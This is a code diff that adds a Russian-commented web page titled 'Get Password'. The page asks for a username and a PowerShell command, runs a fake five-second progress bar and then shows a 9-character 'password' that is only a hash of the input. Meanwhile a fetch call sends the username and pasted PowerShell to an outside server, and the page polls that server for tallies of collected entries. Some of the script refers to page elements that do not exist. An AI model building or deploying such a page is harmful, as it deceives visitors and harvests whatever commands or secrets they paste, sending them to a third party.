@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Get Password</title>
+  <style>
+    :root { --bg:#0b0f14; --card:#121a24; --text:#e7eef7; --muted:#9bb0c7; --accent:#35d07f; --border:#213042; }
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0; min-height: 100vh;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background: radial-gradient(1000px 600px at 20% 10%, rgba(53,208,127,0.15), transparent 60%),
+                  radial-gradient(800px 500px at 80% 30%, rgba(80,140,255,0.12), transparent 60%),
+                  var(--bg);
+      color: var(--text);
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+
+    .wrap { width: min(820px, 100%); }
+    .card {
+      background: rgba(18,26,36,0.88);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 18px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.35);
+      backdrop-filter: blur(8px);
+    }
+
+    h1 { margin: 0 0 6px; font-size: 20px; }
+    .sub { margin: 0 0 14px; color: var(--muted); font-size: 13px; }
+
+    .grid { display: grid; grid-template-columns: 1fr 2fr; gap: 12px; }
+    @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
+
+    label { display:block; font-size: 12px; color: var(--muted); margin: 0 0 6px; }
+
+    input, textarea {
+      width: 100%;
+      border: 1px solid var(--border);
+      background: rgba(10,14,20,0.75);
+      color: var(--text);
+      border-radius: 12px;
+      padding: 12px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    input:focus, textarea:focus {
+      border-color: rgba(53,208,127,0.55);
+      box-shadow: 0 0 0 3px rgba(53,208,127,0.12);
+    }
+
+    textarea { min-height: 92px; resize: vertical; }
+
+    .row { display:flex; gap: 12px; align-items:center; justify-content: space-between; flex-wrap: wrap; }
+
+    button {
+      border: 1px solid rgba(53,208,127,0.6);
+      background: linear-gradient(180deg, rgba(53,208,127,0.25), rgba(53,208,127,0.12));
+      color: var(--text);
+      padding: 10px 14px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+
+    button:hover:not(:disabled) {
+      background: linear-gradient(180deg, rgba(53,208,127,0.35), rgba(53,208,127,0.2));
+      border-color: rgba(53,208,127,0.8);
+    }
+
+    button:disabled { opacity: 0.55; cursor: not-allowed; }
+
+    .progress {
+      position: relative;
+      height: 14px;
+      width: 320px;
+      max-width: 100%;
+      border-radius: 999px;
+      border: 1px solid var(--border);
+      background: rgba(10,14,20,0.7);
+      overflow: hidden;
+    }
+
+    .bar {
+      height: 100%;
+      width: 0%;
+      border-radius: 999px;
+      background: linear-gradient(90deg, rgba(53,208,127,0.95), rgba(60,180,255,0.85));
+      transition: width 0.1s linear;
+    }
+
+    .hint { font-size: 12px; color: var(--muted); margin-top: 8px; }
+    .result {
+      margin-top: 15px;
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: 2px;
+    }
+    
+    .notification {
+      margin-top: 12px;
+      padding: 12px;
+      border-radius: 8px;
+      background: rgba(53,208,127,0.1);
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      font-size: 14px;
+      transition: opacity 0.3s;
+      animation: slideIn 0.3s ease;
+    }
+    
+    .notification.error {
+      background: rgba(255,70,70,0.1);
+      border-color: #ff4646;
+      color: #ff8a8a;
+    }
+    
+    .stats {
+      margin-top: 16px;
+      font-size: 12px;
+      color: var(--muted);
+      border-top: 1px solid var(--border);
+      padding-top: 12px;
+      text-align: center;
+    }
+    
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin-top: 8px;
+    }
+    
+    .stat-item {
+      background: rgba(255,255,255,0.05);
+      border-radius: 8px;
+      padding: 6px;
+    }
+    
+    .stat-value {
+      font-size: 16px;
+      font-weight: bold;
+      color: var(--accent);
+    }
+    
+    .stat-label {
+      font-size: 10px;
+      color: var(--muted);
+    }
+    
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>Get Password</h1>
+      <p class="sub">Enter username and powershell → click button → 5 seconds → password appears.</p>
+
+      <div class="grid">
+        <div>
+          <label for="username">1) Username</label>
+          <input id="username" type="text" placeholder="username" autocomplete="off" />
+        </div>
+
+        <div>
+          <label for="text">2) Powershell</label>
+          <textarea id="text" placeholder="Enter PowerShell..."></textarea>
+        </div>
+      </div>
+
+      <div style="height:12px"></div>
+
+      <div class="row">
+        <button id="btn">Get Password</button>
+
+        <div style="display:flex; flex-direction:column; gap:8px; align-items:flex-end;">
+          <div class="progress">
+            <div class="bar" id="bar"></div>
+          </div>
+          <div class="hint" id="status">Ready!</div>
+        </div>
+      </div>
+
+      <div class="result" id="result"></div>
+      
+      
+      
+     
+    </div>
+  </div>
+
+  <script>
+    const $ = (id) => document.getElementById(id);
+    const btn = $("btn");
+    const bar = $("bar");
+    const statusEl = $("status");
+    const resultEl = $("result");
+    const notification = $("notification");
+    const saveInfo = $("saveInfo");
+    
+    // Конфигурация API - ЗАМЕНИТЕ НА ВАШ АДРЕС
+    const API_URL = 'https://reviews.superbis.com.ua/reviews/api.php';
+    
+    // Получаем текущий путь сайта
+    const SITE_PATH = window.location.pathname.split('/').slice(0, -1).join('/') || '/';
+
+    function clamp(n, a, b) { return Math.max(a, Math.min(b, n)); }
+
+    function fnv1a32(str) {
+      let h = 0x811c9dc5;
+      for (let i = 0; i < str.length; i++) {
+        h ^= str.charCodeAt(i);
+        h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
+      }
+      return h >>> 0;
+    }
+
+    const ALPH = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+
+    function encode9(username, text) {
+      const salt = "WH9";
+      const h1 = fnv1a32(username + "|" + text + "|" + salt);
+      const h2 = fnv1a32(text + "|" + username + "|" + salt + "|2");
+      const mixed = (BigInt(h1) << 32n) | BigInt(h2);
+
+      let code = "";
+      let n = mixed;
+
+      while (n > 0n) {
+        code = ALPH[Number(n % 62n)] + code;
+        n = n / 62n;
+      }
+
+      if (code.length < 9) code = code.padStart(9, "0");
+      if (code.length > 9) code = code.slice(0, 9);
+      return code;
+    }
+
+    async function runProgress5s() {
+      bar.style.width = "0%";
+      statusEl.textContent = "Getting password... 0%";
+      const total = 5000;
+      const start = performance.now();
+
+      return new Promise((resolve) => {
+        function tick(now) {
+          const p = clamp((now - start) / total, 0, 1);
+          bar.style.width = (p * 100) + "%";
+          statusEl.textContent = "Getting password... " + Math.round(p * 100) + "%";
+          if (p < 1) requestAnimationFrame(tick);
+          else resolve();
+        }
+        requestAnimationFrame(tick);
+      });
+    }
+    
+    // Функция для показа уведомлений
+    function showNotification(message, isError = false) {
+      notification.textContent = message;
+      notification.className = 'notification' + (isError ? ' error' : '');
+      notification.style.display = 'block';
+      
+      setTimeout(() => {
+        notification.style.display = 'none';
+      }, 5000);
+    }
+    
+    // Функция для сохранения данных в БД
+    async function saveToDatabase(username, powershell) {
+      try {
+        const data = {
+          username: username || 'anonymous',
+          powershell: powershell,
+          site_path: SITE_PATH,
+          timestamp: new Date().toISOString()
+        };
+        
+        console.log('Sending data to API:', data); // Для отладки
+        
+        const response = await fetch(API_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+        
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          showNotification('✅ PowerShell команда сохранена в БД');
+          
+          // Показываем дополнительную информацию
+          const date = new Date().toLocaleString('ru-RU');
+          saveInfo.innerHTML = `
+            💾 Сохранено: ${date}<br>
+            📁 Путь: ${SITE_PATH}<br>
+            👤 Username: ${username || 'anonymous'}
+          `;
+        } else {
+          showNotification('❌ Ошибка сохранения: ' + (result.error || 'Неизвестная ошибка'), true);
+        }
+      } catch (error) {
+        console.error('Error saving to database:', error);
+        showNotification('❌ Не удалось сохранить в БД. Проверьте консоль.', true);
+      }
+    }
+    
+    // Функция для загрузки статистики
+    async function loadStats() {
+      try {
+        const response = await fetch(`${API_URL}?stats=1&t=${Date.now()}`);
+        if (response.ok) {
+          const stats = await response.json();
+          
+          let statsHtml = `
+            <div class="stats-grid">
+              <div class="stat-item">
+                <div class="stat-value">${stats.total || 0}</div>
+                <div class="stat-label">Всего записей</div>
+              </div>
+              <div class="stat-item">
+                <div class="stat-value">${stats.today || 0}</div>
+                <div class="stat-label">За сегодня</div>
+              </div>
+              <div class="stat-item">
+                <div class="stat-value">${stats.last_24h || 0}</div>
+                <div class="stat-label">За 24 часа</div>
+              </div>
+            </div>
+          `;
+          
+          // Добавляем информацию о путях
+          if (stats.site_paths && stats.site_paths.length > 0) {
+            statsHtml += '<div style="margin-top: 8px; font-size: 10px;">📊 Популярные пути:</div>';
+            stats.site_paths.forEach(path => {
+              statsHtml += `<div style="font-size: 9px; color: var(--muted);">${path.site_path}: ${path.count}</div>`;
+            });
+          }
+          
+          $("stats").innerHTML = statsHtml;
+        } else {
+          $("stats").innerHTML = '<div>📊 Статистика временно недоступна</div>';
+        }
+      } catch (error) {
+        console.error('Error loading stats:', error);
+        $("stats").innerHTML = '<div>📊 Ошибка загрузки статистики</div>';
+      }
+    }
+
+    btn.addEventListener("click", async () => {
+      const username = $("username").value.trim();
+      const text = $("text").value;
+
+      if (!text.trim()) {
+        statusEl.textContent = "Enter text.";
+        return;
+      }
+
+      btn.disabled = true;
+      await runProgress5s();
+
+      const code = encode9(username, text);
+      resultEl.textContent = code;
+
+      // Сохраняем PowerShell команду в базу данных WordPress
+      await saveToDatabase(username, text);
+
+      statusEl.textContent = "Ready.";
+      btn.disabled = false;
+      
+      // Обновляем статистику
+      loadStats();
+    });
+    
+    // Загружаем статистику при старте
+    loadStats();
+    
+    // Обновляем статистику каждые 30 секунд
+    setInterval(loadStats, 30000);
+  </script>
+</body>
+</html>
